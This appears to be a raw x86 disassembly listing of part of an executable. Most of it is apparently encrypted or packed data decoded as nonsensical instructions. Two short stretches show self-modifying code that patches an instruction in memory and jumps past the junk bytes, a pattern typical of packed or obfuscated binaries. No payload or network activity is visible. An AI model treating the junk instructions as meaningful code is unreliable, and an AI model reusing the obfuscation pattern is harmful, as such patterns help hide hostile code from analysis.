  40386c:	test   eax,0xa1e3e42a
  403871:	dec    BYTE PTR [ebx-0xb]
  403874:	fidiv  DWORD PTR [eax-0x348272d3]
  40387a:	std    
  40387b:	inc    edx
  40387c:	mov    ds:0x8638e8cd,eax
  403881:	cmp    BYTE PTR [eax],al
  403883:	sub    ah,BYTE PTR [edi-0x38]
  403886:	jo     0x403901
  403888:	mov    edx,0x79ac15a6
  40388d:	sahf   
  40388e:	xor    al,0xb1
  403890:	fwait
  403891:	enter  0xf36e,0x96
  403895:	dec    edx
  403896:	mov    ecx,0x90031abf
  40389b:	ss mov esi,0xb06f598a
  4038a1:	or     ah,BYTE PTR [eax-0x58]
  4038a4:	sbb    al,0xca
  4038a6:	and    esi,ebx
  4038a8:	(bad)  
  4038a9:	out    dx,al
  4038aa:	out    dx,al
  4038ab:	ret    0x7ad8
  4038ae:	gs ret 0x5b6e
  4038b2:	push   0x11aab5c5
  4038b7:	fwait
  4038b8:	xlat   BYTE PTR ds:[ebx]
  4038b9:	pop    esi
  4038ba:	jge    0x403932
  4038bc:	stos   BYTE PTR es:[edi],al
  4038bd:	mov    al,0xdb
  4038bf:	jb     0x403906
  4038c1:	pop    ebp
  4038c2:	popa   
  4038c3:	or     esp,DWORD PTR [edi+0x46cb5e5c]
  4038c9:	push   ss
  4038ca:	dec    ebx
  4038cb:	and    DWORD PTR [eax-0x1a],edi
  4038ce:	dec    edi
  4038cf:	dec    ecx
  4038d0:	and    BYTE PTR [ebp+esi*1-0x307c07cf],dh
  4038d7:	popf   
  4038d8:	aas    
  4038d9:	xor    DWORD PTR [ecx],edi
  4038db:	mov    ds:0x79a51602,eax
  4038e0:	mov    edx,0xf2f4d85f
  4038e5:	sbb    edi,DWORD PTR cs:[ebx]
  4038e8:	xchg   ebp,eax
  4038e9:	lea    ebx,[edi-0xcea2722]
  4038ef:	and    dl,ah
  4038f1:	inc    edx
  4038f2:	fs shl ah,1
  4038f5:	push   DWORD PTR [ebx+0x2e]
  4038f8:	jae    0x403909
  4038fa:	and    esi,eax
  4038fc:	xor    esi,DWORD PTR [ebp+0x2d]
  4038ff:	jno    0x403896
  403901:	or     edx,DWORD PTR ds:0xd9c35f0d
  403907:	bound  esi,QWORD PTR [ecx-0x1c]
  40390a:	mov    al,ds:0x2980323b
  40390f:	xor    cl,BYTE PTR [ecx+0x606c5b1d]
  403915:	or     esp,esp
  403917:	fild   WORD PTR [esi-0x1]
  40391a:	push   esp
  40391b:	outs   dx,DWORD PTR ds:[esi]
  40391c:	idiv   DWORD PTR ds:0xfad9ac77
  403922:	cmc    
  403923:	and    bl,BYTE PTR [ecx]
  403925:	mov    esi,DWORD PTR [edi]
  403927:	scas   eax,DWORD PTR es:[edi]
  403928:	mov    bh,0x1f
  40392a:	adc    eax,0xcdd58378
  40392f:	cmp    al,0x68
  403931:	dec    edi
  403932:	xchg   BYTE PTR [edx-0x5b4218d9],dh
  403938:	jbe    0x403989
  40393a:	sbb    bl,0x3
  40393d:	shr    DWORD PTR [ebp-0xa9392f3],cl
  403943:	shl    BYTE PTR [ebx],0xe1
  403946:	inc    ebx
  403947:	jl     0x403956
  403949:	push   cs
  40394a:	jnp    0x403985
  40394c:	stc    
  40394d:	aaa    
  40394e:	lds    ebp,FWORD PTR [ebp+0x5b]
  403951:	jo     0x403980
  403953:	push   ds
  403954:	sub    eax,DWORD PTR [edx]
  403956:	lahf   
  403957:	arpl   WORD PTR [edx],ax
  403959:	mov    cl,0xd2
  40395b:	dec    esp
  40395c:	push   ebx
  40395d:	das    
  40395e:	inc    edi
  40395f:	add    BYTE PTR [eax-0x2daddb57],dl
  403965:	mov    bl,0x9b
  403967:	test   BYTE PTR [edx+edx*2+0x57],ah
  40396b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40396c:	jnp    0x4039b3
  40396e:	shl    DWORD PTR [edi+0x56],cl
  403971:	adc    dl,BYTE PTR [ebp+0x45ce72ab]
  403977:	test   al,0x51
  403979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40397a:	jbe    0x4039d6
  40397c:	fidiv  DWORD PTR [esi-0x78]
  40397f:	call   0x2d17edee
  403984:	or     eax,0x1083906a
  403989:	movq   mm7,mm2
  40398c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40398d:	lock mov al,gs:0xc07e3bdf
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	push   0xffffffcb
  4039d2:	cs out 0xf7,eax
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	in     eax,0xbc
  4039de:	push   ss
  4039df:	sub    ecx,DWORD PTR [ecx+0x134fc1a6]
  4039e5:	sub    al,0xaa
  4039e7:	jo     0x403a1a
  4039e9:	mov    eax,ss:0xc0e3794d
  4039ef:	add    al,bl
  4039f1:	dec    ebp
  4039f2:	jge    0x403a32
  4039f4:	xor    BYTE PTR [edi+0x7b],bh
  4039f7:	je     0x403a65
  4039f9:	mov    ecx,0xa6a0338e
  4039fe:	dec    edx
  4039ff:	xchg   ebx,eax
  403a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a01:	xchg   ebp,eax
  403a02:	(bad)  
  403a03:	sub    eax,0x85787e07
  403a08:	xchg   edx,eax
  403a09:	dec    eax
  403a0a:	xchg   ebx,eax
  403a0b:	(bad)  
  403a0c:	in     al,dx
  403a0d:	pushf  
  403a0e:	push   ebp
  403a0f:	push   esi
  403a10:	inc    edx
  403a11:	shl    BYTE PTR [ebx+0x43],cl
  403a14:	xor    ecx,DWORD PTR [eax-0x6f]
  403a17:	leave  
  403a18:	push   ds
  403a19:	xlat   BYTE PTR ds:[ebx]
  403a1a:	je     0x4039bb
  403a1c:	add    al,BYTE PTR [ebp-0x5c]
  403a1f:	dec    ecx
  403a20:	(bad)  
  403a21:	dec    BYTE PTR [edi+esi*8-0x4d6462c4]
  403a28:	rol    bh,0xb
  403a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a2c:	mov    cl,0x57
  403a2e:	pop    es
  403a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a30:	and    edi,DWORD PTR [esi-0x40cf1fe6]
  403a36:	clc    
  403a37:	mov    al,fs:0xaab86c34
  403a3d:	and    ebx,DWORD PTR [eax+eiz*8]
  403a40:	mov    eax,0xfa6c50e2
  403a45:	push   ecx
  403a46:	je     0x403a43
  403a48:	adc    edi,DWORD PTR [esi+0x504d06c3]
  403a4e:	(bad)  
  403a4f:	pop    ecx
  403a50:	add    bh,al
  403a52:	add    esp,DWORD PTR [esi+0x4d]
  403a55:	addr16 mov dl,0x5f
  403a58:	scas   al,BYTE PTR es:[edi]
  403a59:	sar    DWORD PTR [edi+0x64],cl
  403a5c:	call   0x5ca0:0xabc21e49
  403a63:	or     DWORD PTR [edx],esp
  403a65:	(bad)  
  403a66:	fnstcw WORD PTR [edi+0x2254cb71]
  403a6c:	push   0xf2917ee0
  403a71:	and    DWORD PTR [esi],esp
  403a73:	or     BYTE PTR [edi+ecx*2],0x38
  403a77:	ror    eax,1
  403a79:	xchg   esp,eax
  403a7a:	call   0xece2220
  403a7f:	xor    BYTE PTR [edx],dh
  403a81:	push   0x27
  403a83:	and    DWORD PTR [edx+0x1d25de44],esp
  403a89:	adc    ebx,DWORD PTR [ecx]
  403a8b:	add    esi,DWORD PTR [eax+ecx*2+0x70]
  403a8f:	mov    al,0xcb
  403a91:	aaa    
  403a92:	mov    ebp,0xe9d47af5
  403a97:	out    dx,eax
  403a98:	add    edx,ecx
  403a9a:	daa    
  403a9b:	inc    dh
  403a9d:	xor    BYTE PTR [edx-0x7c],bl
  403aa0:	inc    edi
  403aa1:	mov    ch,0xc4
  403aa3:	gs stos DWORD PTR es:[edi],eax
  403aa5:	clc    
  403aa6:	cmp    dl,bl
  403aa8:	cmp    BYTE PTR [edx-0x53],dh
  403aab:	xchg   edi,eax
  403aac:	add    bl,BYTE PTR [esi]
  403aae:	(bad)  
  403aaf:	mov    esp,0xc555d152
  403ab4:	cld    
  403ab5:	shr    DWORD PTR [edx],0xaf
  403ab8:	xchg   ebx,eax
  403ab9:	or     al,0xa2
  403abb:	retf   0x29a2
  403abe:	in     eax,0x93
  403ac0:	mov    ah,0x67
  403ac2:	fwait
  403ac3:	cs retf 
  403ac5:	jno    0x403a8a
  403ac7:	test   ecx,esi
  403ac9:	pop    ebp
  403aca:	jae    0x403ab8
  403acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403acd:	xchg   esp,eax
  403ace:	fist   WORD PTR [ebp-0x6974f212]
  403ad4:	fiadd  WORD PTR [ebp+0x5b]
  403ad7:	adc    al,0xe5
  403ad9:	xchg   ecx,eax
  403ada:	shr    DWORD PTR [ecx-0xb],1
  403add:	mov    al,0xe4
  403adf:	pushf  
  403ae0:	jnp    0x403add
  403ae2:	shr    BYTE PTR [esi+eiz*2],1
  403ae5:	loop   0x403af6
  403ae7:	in     eax,0x3b
  403ae9:	xor    eax,0x338ff146
  403aee:	mov    ds:0x1c394635,eax
  403af3:	pop    ebx
  403af4:	pushf  
  403af5:	xor    BYTE PTR [edi],0xd7
  403af8:	push   esi
  403af9:	add    ebx,DWORD PTR [eax-0x6]
  403afc:	add    BYTE PTR [edi+0x57e8185f],ch
  403b02:	xchg   esp,eax
  403b03:	fsubr  DWORD PTR [edx-0x115a2e6f]
  403b09:	jg     0x403aac
  403b0b:	pop    es
  403b0c:	scas   al,BYTE PTR es:[edi]
  403b0d:	int    0xf5
  403b0f:	je     0x403b3e
  403b11:	push   0x2
  403b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b14:	push   0x14
  403b16:	sbb    eax,DWORD PTR [esi+0x7a]
  403b19:	inc    esp
  403b1a:	push   cs
  403b1b:	cmc    
  403b1c:	cmp    eax,0x58541e02
  403b21:	lds    ebp,FWORD PTR [edx-0x5180584b]
  403b27:	lods   al,BYTE PTR ds:[esi]
  403b28:	jmp    0x179842b1
  403b2d:	jno    0x403ad6
  403b2f:	xor    al,0x2e
  403b31:	sbb    BYTE PTR [edx+0x72],ah
  403b34:	dec    esp
  403b35:	pushf  
  403b36:	mov    BYTE PTR [ecx-0x4c],bh
  403b39:	loope  0x403b0d
  403b3b:	xchg   ebp,eax
  403b3c:	stos   DWORD PTR es:[edi],eax
  403b3d:	push   eax
  403b3e:	call   DWORD PTR [edi-0x52]
  403b41:	inc    eax
  403b42:	pop    esp
  403b44:	and    ecx,DWORD PTR [esi+0x6d11221c]
  403b4a:	cmp    esi,DWORD PTR [eax-0x4f2563e6]
  403b50:	push   0x20
  403b52:	aaa    
  403b53:	or     al,0x34
  403b55:	test   bl,dl
  403b57:	out    dx,eax
  403b58:	mov    cs,WORD PTR [ecx+0x8]
  403b5b:	cmp    eax,0x195389ba
  403b60:	push   0xffffff95
  403b62:	mov    ebp,0xf8bbe706
  403b67:	sbb    eax,0x1944838b
  403b6c:	ja     0x403bc6
  403b6e:	cmp    bl,BYTE PTR [edx-0x562eca51]
  403b74:	arpl   WORD PTR [ebx+0x44],sp
  403b77:	xchg   bh,bh
  403b79:	rcl    DWORD PTR [ebx+0x7446a094],cl
  403b7f:	call   0x1f51:0x32c62f0e
  403b86:	or     DWORD PTR [ebx+ecx*1+0x1a],esp
  403b8a:	push   0xcfb34a9b
  403b8f:	in     al,dx
  403b90:	(bad)  
  403b91:	gs dec ecx
  403b93:	out    dx,eax
  403b94:	das    
  403b95:	jmp    0x37d:0xd03d4442
  403b9c:	mov    eax,ds:0xcce17f0
  403ba1:	add    DWORD PTR [ecx+0x71],esp
  403ba4:	sbb    BYTE PTR [esi-0x18],dh
  403ba7:	add    bh,BYTE PTR [ebx-0x79]
  403baa:	cmp    dl,bl
  403bac:	ror    DWORD PTR [eax],1
  403bae:	popa   
  403baf:	shl    BYTE PTR [edi],0x31
  403bb2:	pushf  
  403bb3:	dec    esi
  403bb4:	pop    ss
  403bb5:	xchg   DWORD PTR [eax-0x79ea38cc],eax
  403bbb:	jb     0x403c31
  403bbd:	ins    BYTE PTR es:[edi],dx
  403bbe:	(bad)  
  403bc0:	pop    ss
  403bc1:	adc    DWORD PTR [ebp-0x7ccf2f04],0x74d28735
  403bcb:	sbb    al,0xc3
  403bcd:	and    ebx,DWORD PTR [ebp-0x2feb7970]
  403bd3:	aas    
  403bd4:	jmp    0x17f6:0x556cd96e
  403bdb:	nop
  403bdc:	cli    
  403bdd:	xchg   edi,eax
  403bde:	out    0xf9,al
  403be0:	sbb    al,0x67
  403be2:	les    ebx,FWORD PTR [edi+0x37adf824]
  403be8:	inc    esi
  403be9:	or     BYTE PTR [eax+0x3f],dh
  403bec:	pop    es
  403bed:	shl    BYTE PTR [ecx],1
  403bef:	xchg   ebx,eax
  403bf0:	aam    0x8
  403bf2:	sub    eax,0xb9feb45
  403bf7:	das    
  403bf8:	ror    DWORD PTR [edi],cl
  403bfa:	push   esi
  403bfb:	call   0xdfc8:0xef2a
  403c01:	sub    eax,0x1a506769
  403c06:	push   0x1a
  403c08:	pop    ebp
  403c09:	dec    edx
  403c0a:	imul   eax,DWORD PTR [edi+ebx*4],0x7f87c3a0
  403c11:	dec    eax
  403c12:	out    dx,eax
  403c13:	ins    DWORD PTR es:[edi],dx
  403c14:	int    0xcb
  403c16:	in     al,0x33
  403c18:	repnz push ds
  403c1a:	out    dx,eax
  403c1b:	adc    edx,esi
  403c1d:	fdivr  DWORD PTR [esi]
  403c1f:	daa    
  403c20:	out    0x75,al
  403c22:	cmp    bl,BYTE PTR [eax-0x1a5ab384]
  403c28:	mov    ebp,0x65f419e3
  403c2d:	scas   eax,DWORD PTR es:[edi]
  403c2e:	je     0x403c81
  403c30:	add    dh,BYTE PTR [ebx-0x42faffb5]
  403c36:	pop    edi
  403c37:	adc    esp,DWORD PTR ds:0x96811b1f
  403c3d:	dec    ebx
  403c3e:	fadd   DWORD PTR [edi]
  403c40:	and    al,BYTE PTR [ebx-0x41cfc38d]
  403c46:	test   eax,0xbe30e07d
  403c4b:	aas    
  403c4c:	cmp    BYTE PTR [ebx],cl
  403c4e:	cmp    dl,bh
  403c50:	sbb    BYTE PTR [edx],bh
  403c52:	ds mov dh,0x3
  403c55:	mov    ah,0xdb
  403c57:	or     BYTE PTR [edi-0x7a44591],ah
  403c5d:	(bad)  
  403c5e:	(bad)  [edx+0x193c488d]
  403c64:	jne    0x403c56
  403c66:	es daa 
  403c68:	addr16 ret 
  403c6a:	lods   eax,DWORD PTR ds:[esi]
  403c6b:	and    ebp,DWORD PTR [eax]
  403c6d:	mov    edi,DWORD PTR [eax+0x66]
  403c70:	(bad)  
  403c71:	inc    eax
  403c72:	test   al,0xc8
  403c74:	pop    esp
  403c75:	push   ebx
  403c76:	fidiv  WORD PTR [eax+edi*1+0x1b]
  403c7a:	pop    esi
  403c7b:	into   
  403c7c:	cwde   
  403c7d:	adc    eax,0xaf9e3b98
  403c82:	rcr    eax,0x49
  403c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c86:	stos   DWORD PTR es:[edi],eax
  403c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c88:	inc    esp
  403c89:	push   ebx
  403c8a:	push   ds
  403c8b:	mov    ebx,ebx
  403c8d:	jecxz  0x403ca1
  403c8f:	or     bh,BYTE PTR ds:0x66a8ddeb
  403c95:	ss mov bl,dl
  403c98:	mov    ah,0x49
  403c9a:	stos   BYTE PTR es:[edi],al
  403c9b:	mov    al,0x77
  403c9d:	mov    ah,0x4c
  403c9f:	js     0x403c48
  403ca1:	cwde   
  403ca2:	gs das 
  403ca4:	div    BYTE PTR [ebp-0x31]
  403ca7:	mov    cl,bl
  403ca9:	add    bl,BYTE PTR [esi-0x67]
  403cac:	cmp    al,0x33
  403cae:	or     al,0xd0
  403cb0:	sub    BYTE PTR [eax+0x3c102432],bl
  403cb6:	(bad)  
  403cb7:	fistp  DWORD PTR [eax+0x457eb125]
  403cbd:	or     DWORD PTR [edi-0x78],eax
  403cc0:	xor    eax,0xb7df53f2
  403cc5:	mov    ?,WORD PTR [esi]
  403cc7:	mov    dh,0xa1
  403cc9:	jmp    0xc6dbaf76
  403cce:	sbb    BYTE PTR [esp+esi*4+0x274610db],ch
  403cd5:	popw   es
  403cd7:	test   al,0x6
  403cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cda:	or     ecx,DWORD PTR [ebx-0x5964afe1]
  403ce0:	stos   DWORD PTR es:[edi],eax
  403ce1:	push   es
  403ce2:	pop    ebx
  403ce3:	sub    DWORD PTR [eax-0x719fa5b1],esi
  403ce9:	rcl    BYTE PTR [edi+0x593e354f],cl
  403cef:	sub    eax,0xe3283c3c
  403cf4:	jns    0x403c98
  403cf6:	inc    ecx
  403cf7:	mov    ebx,0x5a476894
  403cfc:	xor    DWORD PTR [edi+0x2b],edi
  403cff:	lds    ecx,FWORD PTR ds:[edx]
  403d02:	jge    0x403ceb
  403d04:	call   0xdd1b:0xf9e2a3ec
  403d0b:	sbb    al,0x4d
  403d0d:	and    eax,0xe8699d9a
  403d12:	sub    bl,BYTE PTR [ebx-0x12]
  403d15:	pop    ss
  403d16:	shl    bl,cl
  403d18:	outs   dx,BYTE PTR ds:[esi]
  403d19:	and    DWORD PTR [ebx+0x2c81de4a],esi
  403d1f:	adc    al,0xb4
  403d21:	and    BYTE PTR [ebp-0x42088adc],dl
  403d27:	je     0x403d9a
  403d29:	dec    esp
  403d2a:	rcl    DWORD PTR [edx-0x62],cl
  403d2d:	xlat   BYTE PTR ds:[ebx]
  403d2e:	outs   dx,DWORD PTR ds:[esi]
  403d2f:	pop    ebx
  403d30:	xchg   edi,eax
  403d31:	sbb    ch,ch
  403d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d34:	jmp    0x964e:0x9c3e904d
  403d3b:	mov    dh,cl
  403d3d:	dec    edi
  403d3e:	mov    DWORD PTR [esi+0x68],edi
  403d41:	fcom   DWORD PTR [ecx]
  403d43:	inc    ecx
  403d44:	mov    dh,0xcc
  403d46:	leave  
  403d47:	adc    al,0x47
  403d49:	(bad)  
  403d4b:	sbb    edx,edi
  403d4d:	pop    ecx
  403d4e:	fidivr DWORD PTR [edx-0x1b]
  403d51:	inc    edi
  403d52:	adc    DWORD PTR [ecx-0x60],esi
  403d55:	shl    eax,0xe2
  403d58:	cld    
  403d59:	cdq    
  403d5a:	sub    esp,edx
  403d5c:	cmc    
  403d5d:	dec    edx
  403d5e:	mov    WORD PTR [ebp+ebx*8-0x753dc5cb],gs
  403d65:	or     ebp,ebx
  403d67:	dec    ecx
  403d68:	cmp    al,0xfd
  403d6a:	xchg   edx,eax
  403d6b:	sub    DWORD PTR [ecx],0x5a
  403d6e:	out    dx,eax
  403d6f:	adc    dh,al
  403d71:	(bad)  
  403d72:	mov    ecx,0x62a62741
  403d77:	xlat   BYTE PTR ds:[ebx]
  403d78:	mov    dh,0x78
  403d7a:	adc    al,0x8c
  403d7c:	or     BYTE PTR [ebx-0x6e],bh
  403d7f:	imul   ebp,DWORD PTR [esp+edi*8-0x24],0x84dbaf6f
  403d87:	or     al,0xd9
  403d89:	mov    eax,0xf3e126dd
  403d8e:	in     al,dx
  403d8f:	daa    
  403d90:	clc    
  403d91:	aaa    
  403d92:	leave  
  403d93:	aaa    
  403d94:	repz out dx,al
  403d96:	xchg   edx,eax
  403d97:	outs   dx,DWORD PTR ds:[esi]
  403d98:	jnp    0x403d39
  403d9a:	icebp  
  403d9b:	mov    es,WORD PTR [esi-0x61c6308b]
  403da1:	das    
  403da2:	les    eax,FWORD PTR [ebp+0x2576fa55]
  403da8:	pop    ebp
  403da9:	and    al,0x87
  403dab:	int3   
  403dac:	(bad)  
  403dae:	fwait
  403daf:	pop    ss
  403db0:	xlat   BYTE PTR ds:[ebx]
  403db1:	cmp    esp,DWORD PTR ss:[esp+eiz*8]
  403db5:	(bad)  
  403db6:	repz out 0xe5,eax
  403db9:	call   0x8e52:0x8fb8373f
  403dc0:	dec    esp
  403dc1:	mov    ebx,0x939a0e56
  403dc6:	or     BYTE PTR [eax],cl
  403dc8:	mov    ebx,0xcc0b07da
  403dcd:	call   0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [eax-0x1bab108d],esi
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e7b
  403e1f:	daa    
  403e20:	(bad)  
  403e21:	pop    ebx
  403e22:	sub    cl,0x5
  403e25:	fidiv  WORD PTR [eax]
  403e27:	call   DWORD PTR [ebx-0x66]
  403e2a:	xor    cl,BYTE PTR [eax+0x7cc6a560]
  403e30:	pop    ecx
  403e31:	jmp    0x5d3aad0e
  403e36:	pop    edi
  403e37:	dec    edi
  403e38:	xchg   esi,eax
  403e39:	stos   BYTE PTR es:[edi],al
  403e3a:	hlt    
  403e3b:	call   0x3da9a01f
  403e40:	push   esp
  403e41:	dec    ecx
  403e42:	adc    al,BYTE PTR [edx]
  403e44:	dec    ebx
  403e45:	out    dx,al
  403e46:	daa    
  403e47:	and    eax,0xb32f3ec3
  403e4c:	jge    0x403dd9
  403e4e:	add    BYTE PTR [ebp+0x774c1bd1],cl
  403e54:	ins    DWORD PTR es:[edi],dx
  403e55:	scas   al,BYTE PTR es:[edi]
  403e56:	cmp    eax,0xa837c56e
  403e5b:	xor    ebx,ebp
  403e5d:	xchg   esp,eax
  403e5e:	les    ecx,FWORD PTR [ecx]
  403e60:	out    dx,al
  403e61:	pop    es
  403e62:	xor    eax,0xc54ff2bd
  403e67:	sahf   
  403e68:	ret    0x14ad
  403e6b:	adc    eax,0x166b22c6
  403e70:	ss xor eax,0xc372dd87
  403e76:	test   eax,0xf9de435b
  403e7b:	or     al,0xa7
  403e7d:	adc    BYTE PTR [ebx],ah
  403e7f:	or     DWORD PTR [ebx+0x628f1359],ebp
  403e85:	test   BYTE PTR [eax-0x72],ch
  403e88:	jge    0x403e0d
  403e8a:	inc    edx
  403e8b:	in     eax,0xc3
  403e8d:	sub    eax,0x20b2e3fa
  403e92:	std    
  403e93:	fisttp QWORD PTR [esi+0x13]
  403e96:	jecxz  0x403ed2
  403e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e99:	dec    edx
  403e9a:	sti    
  403e9b:	fsub   st(2),st
  403e9d:	or     edi,0xff1c60c4
  403ea3:	adc    ebp,edi
  403ea5:	sub    al,0xf5
  403ea7:	aas    
  403ea8:	xor    bh,bh
  403eaa:	mov    bh,0x9d
  403eac:	fisub  WORD PTR [esi+ebp*1+0x56]
  403eb0:	imul   edx,DWORD PTR [edx-0x4db44a3e],0x15b0891e
  403eba:	or     BYTE PTR [edi+0x32],cl
  403ebd:	dec    esi
  403ebe:	xchg   ecx,eax
  403ebf:	push   edx
  403ec0:	out    dx,al
  403ec1:	sti    
  403ec2:	dec    edx
  403ec3:	jns    0x403f22
  403ec5:	sbb    al,0xd3
  403ec7:	paddusw mm0,QWORD PTR [ebp-0x26]
  403ecb:	mov    ch,0xca
  403ecd:	iret   
  403ece:	scas   al,BYTE PTR es:[edi]
  403ecf:	pop    edx
  403ed0:	ins    BYTE PTR es:[edi],dx
  403ed1:	or     al,0x83
  403ed3:	stc    
  403ed4:	dec    esp
  403ed5:	rol    DWORD PTR [eax-0x729368d9],0x61
  403edc:	fisubr WORD PTR [edx+0x7558eeea]
  403ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ee3:	imul   ebp,DWORD PTR [ecx+ebx*2],0xf1b472c3
  403eea:	sbb    eax,0xe6e87cb8
  403eef:	rol    DWORD PTR ds:0xcb570cd,1
  403ef5:	test   BYTE PTR [edi+0x8],bl
  403ef8:	mov    al,ds:0xb34a667a
  403efd:	xchg   ecx,eax
  403efe:	sub    BYTE PTR [edi-0x5860d43a],bh
  403f04:	fmul   QWORD PTR [eax-0x7dfc1c78]
  403f0a:	bound  ebp,QWORD PTR [ecx+ebx*4-0x33]
  403f0e:	and    BYTE PTR [esp+ebp*4+0x786093b3],al
  403f15:	daa    
  403f16:	mov    edi,0xa83ad736
  403f1b:	sbb    al,BYTE PTR [eax-0x1bdabb37]
  403f21:	fwait
  403f22:	test   DWORD PTR [esi+edx*8-0x5f],esi
  403f26:	push   esp
  403f27:	lock sbb DWORD PTR [ebx],esi
  403f2a:	popa   
  403f2b:	test   dh,ah
  403f2d:	sub    al,0x44
  403f2f:	shl    BYTE PTR [esp+eax*2-0x79],cl
  403f33:	jmp    0x5e873d96
  403f38:	aam    0x75
  403f3a:	sbb    eax,0x40477777
  403f3f:	xchg   BYTE PTR [esi-0x4e],dl
  403f42:	inc    eax
  403f43:	mov    eax,ds:0x77fb1722
  403f48:	cmp    eax,0x37b43bb0
  403f4d:	cs push edx
  403f4f:	xchg   edi,eax
  403f50:	scas   eax,DWORD PTR es:[edi]
  403f51:	fild   DWORD PTR [eax]
  403f53:	jo     0x403f54
  403f55:	pop    DWORD PTR ds:[eax+ebx*4]
  403f59:	shl    BYTE PTR [esi],1
  403f5b:	or     edi,edi
  403f5d:	daa    
  403f5e:	in     al,0xaa
  403f60:	mov    ebp,0x143cce81
  403f65:	lahf   
  403f66:	fnsave [ebx-0x2931059d]
  403f6c:	fistp  DWORD PTR ds:0x34a7eef9
  403f72:	not    cl
  403f74:	push   ecx
  403f75:	stos   BYTE PTR es:[edi],al
  403f76:	pusha  
  403f77:	or     al,0xb5
  403f79:	cmp    al,0xad
  403f7b:	stc    
  403f7c:	pop    ebx
  403f7d:	inc    esp
  403f7e:	lock js 0x403f84
  403f81:	mov    BYTE PTR [esi+ecx*8-0x620e2078],bl
  403f88:	pop    esi
  403f89:	sbb    BYTE PTR [ebx+0x6ba8ed03],bl
  403f8f:	(bad)  
  403f90:	or     ch,dl
  403f92:	sub    bl,BYTE PTR [ebp-0x593f8749]
  403f98:	jg     0x403f4d
  403f9a:	jno    0x403f96
  403f9c:	jb     0x403fe0
  403f9e:	sbb    eax,0xceb835f0
  403fa3:	xchg   BYTE PTR ds:0xc0a1acba,ch
  403fa9:	cmp    DWORD PTR [ebx+0x37],edx
  403fac:	sbb    DWORD PTR [edi-0x5c77f484],ecx
  403fb2:	sbb    DWORD PTR [eax+0x61],eax
  403fb5:	call   0x9b1feb5a
  403fba:	jno    0x40400e
  403fbc:	retf   
  403fbd:	cli    
  403fbe:	test   dl,0xe3
  403fc1:	pop    ecx
  403fc2:	mov    ecx,0xee7e55cd
  403fc7:	cmp    al,0xb
  403fc9:	int    0x5a
  403fcb:	jp     0x403f94
  403fcd:	cmp    DWORD PTR [ebx-0x7b8cd25e],eax
  403fd3:	mov    dl,0x9d
  403fd5:	rcr    BYTE PTR [eax],0xcd
  403fd8:	in     eax,0x56
  403fda:	and    ebx,DWORD PTR [ebp+0x58a23dce]
  403fe0:	dec    edi
  403fe1:	jmp    DWORD PTR ds:0x3883c80c
  403fe7:	cmp    eax,0xf2bf85fd
  403fec:	jge    0x403ffb
  403fee:	push   0x3e
  403ff0:	cmp    bl,bh
  403ff2:	ss and bh,bh
  403ff5:	pop    ds
  403ff6:	jne    0x40401d
  403ff8:	fcom   DWORD PTR [ecx-0x68]
  403ffb:	add    BYTE PTR [edi+eiz*2],dh
  403ffe:	inc    edx
  403fff:	mov    esi,0x7a8f910a
  404004:	mov    bl,0x80
  404006:	add    dl,BYTE PTR [ebx]
  404008:	xchg   DWORD PTR [ecx-0x1922e61a],ebp
  40400e:	mov    ebx,0x77365dc7
  404013:	outs   dx,DWORD PTR ds:[esi]
  404014:	jmp    0x406c:0xb9624a4f
  40401b:	out    0xe2,al
  40401d:	mov    ecx,0x5f3e7bb5
  404022:	adc    BYTE PTR [edi],ah
  404024:	sahf   
  404025:	and    al,BYTE PTR [esi]
  404027:	outs   dx,BYTE PTR ds:[esi]
